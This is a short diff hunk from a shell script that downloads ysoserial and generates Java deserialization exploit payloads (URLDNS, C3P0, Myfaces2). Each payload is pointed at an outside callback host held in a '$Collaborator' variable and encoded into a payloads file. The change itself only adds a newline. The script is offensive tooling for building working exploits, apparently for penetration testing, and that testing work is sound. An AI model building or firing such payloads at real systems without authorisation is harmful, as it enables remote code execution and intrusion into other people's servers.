@@ -19,6 +19,7 @@ curl -LkO https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoseria
 java -jar ysoserial-all.jar >& out
 printf "\n\e[1;37m[#]\e[0m Building Payloads (slow) \e[1;37m[#]\e[0m\n"
 java -jar ysoserial-all.jar URLDNS "https://URLDNS.$Collaborator/" 2>&- | $Encoding >> payloads.inc
+printf "\n" >> payloads.inc
 java -jar ysoserial-all.jar C3P0 "https://$Collaborator/:C3P0" 2>&- | $Encoding >> payloads.inc
 printf "\n" >> payloads.inc
 java -jar ysoserial-all.jar Myfaces2 "https://$Collaborator/:Myfaces2" 2>&- | $Encoding >> payloads.inc
